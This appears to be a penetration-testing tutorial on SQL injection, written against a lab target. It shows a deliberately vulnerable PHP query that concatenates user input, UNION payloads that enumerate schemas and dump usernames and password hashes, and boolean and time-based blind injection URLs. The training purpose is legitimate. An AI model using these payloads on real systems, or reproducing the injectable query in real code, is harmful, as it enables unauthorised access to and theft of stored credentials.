# Union SQL Injection | Blind SQL Injections

## Introduction

In this technical article, we explore advanced offensive security techniques focusing on SQL injection vulnerabilities, specifically UNION-based and Blind SQL Injection payloads. These techniques are critical for penetration testers and security professionals to understand when assessing the security posture of web applications.

### Prerequisites

- Basic understanding of SQL queries and injection vulnerabilities.
- Familiarity with using Kali Linux for penetration testing.

## 10.2.2. UNION-based Payloads

When dealing with in-band SQL injections where query results are displayed along with application-generated content, UNION-based SQL injections are a powerful tool. The UNION keyword allows executing an additional SELECT statement and merging results into one, facilitating data extraction and enumeration.

### Scenario Setup

Consider a vulnerable web application with the following query:

```php
$query = "SELECT * FROM customers WHERE name LIKE '".$_POST["search_input"]."%'";
```

This query fetches records from the `customers` table based on a user-provided input.

### Exploitation Strategy

1. **Identifying Number of Columns**

   To exploit UNION-based SQL injection, first determine the number of columns:

   ```sql
   ' ORDER BY 1-- //
   ```

   Increment the column number until an error occurs, indicating the number of columns.

2. **Enumerating Database Information**

   Use UNION to retrieve database information such as name, user, and version:

   ```sql
   '%\' UNION SELECT database(), user(), @@version, null, null -- //
   ```

   Adjust the query to fit the exact number of columns and types expected by the application.

3. **Enumerating Tables and Columns**

   Explore database schema by querying `information_schema.columns`:

   ```sql
   '%\' UNION SELECT null, table_name, column_name, table_schema, null FROM information_schema.columns WHERE table_schema=database() -- //
   ```

   Retrieve table and column names dynamically within the current database.

4. **Dumping Specific Table Data**

   Extract sensitive data from a specific table like `users`:

   ```sql
   '%\' UNION SELECT null, username, password, null, null FROM users -- //
   ```

   Use this payload to retrieve usernames and hashed passwords from the `users` table.

### Conclusion

UNION-based SQL injection attacks are potent for extracting data and enumerating database structures. Understanding column numbers, types, and crafting precise queries are essential for successful exploitation.

## 10.2.3. Blind SQL Injections

Blind SQL injections exploit vulnerabilities where application responses do not directly reveal database results. Techniques like boolean-based and time-based injections infer query results based on application behavior.

### Scenario Description

Explore a vulnerable application susceptible to blind SQL injection:

- Application URL: `http://192.168.50.16/blindsqli.php`
- Parameter: `user`

### Exploitation Techniques

1. **Boolean-Based Blind SQL Injection**

   Test for existence of records using a true condition:

   ```plaintext
   http://192.168.50.16/blindsqli.php?user=offsec' AND 1=1 -- //
   ```

   Application responds differently based on true or false conditions, revealing presence of `offsec` user.

2. **Time-Based Blind SQL Injection**

   Delay application response to infer true or false conditions:

   ```plaintext
   http://192.168.50.16/blindsqli.php?user=offsec' AND IF(1=1, sleep(3),'false') -- //
   ```

   Application stalls if condition is true, confirming existence of `offsec` user.

### Conclusion

Blind SQL injections leverage application responses to infer database query results. Boolean-based and time-based techniques are crucial for detecting and exploiting blind SQL injection vulnerabilities.

---

This technical article provides foundational knowledge and practical examples for conducting advanced SQL injection attacks. Understanding these techniques equips security professionals with essential skills for identifying and mitigating SQL injection vulnerabilities in web applications.

